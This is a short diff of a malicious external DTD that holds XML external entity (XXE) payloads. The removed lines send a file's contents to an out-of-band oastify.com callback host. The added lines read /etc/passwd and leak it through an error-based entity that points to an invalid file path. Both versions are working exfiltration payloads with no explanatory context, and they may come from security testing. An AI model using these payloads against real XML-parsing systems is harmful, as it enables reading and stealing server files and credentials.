@@ -1,2 +1,4 @@
-<!ENTITY % all "<!ENTITY send SYSTEM 'http://hufilchsdeba0ps4seg6fwexjopfda1z.oastify.com/?collect=%file;'>">
-%all;
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
+%eval;
+%exfil;
